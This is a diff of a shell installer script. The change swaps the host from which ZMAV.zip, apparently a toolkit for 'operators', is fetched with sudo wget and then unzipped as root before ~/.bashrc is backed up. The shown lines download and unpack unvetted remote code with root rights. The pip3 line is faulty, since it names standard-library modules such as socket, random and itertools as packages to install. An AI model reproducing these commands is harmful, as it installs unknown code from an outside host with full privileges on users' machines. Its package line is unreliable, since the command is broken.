@@ -20,7 +20,7 @@ sudo apt-get install -y python3
 sudo apt-get install -y python3-pip
 sudo pip3 install requests colorama itertools idna uritools appdirs tldextract socket random  struct traceback urlextract configparser
 sudo apt install -y nano
-sudo wget https://w3ll.shop/operators/ZMAV.zip
+sudo wget https://w3ll.store/operators/ZMAV.zip
 sudo unzip -o ZMAV.zip
 sudo rm ZMAV.zip
 cp ~/.bashrc ~/.bashrc-bak
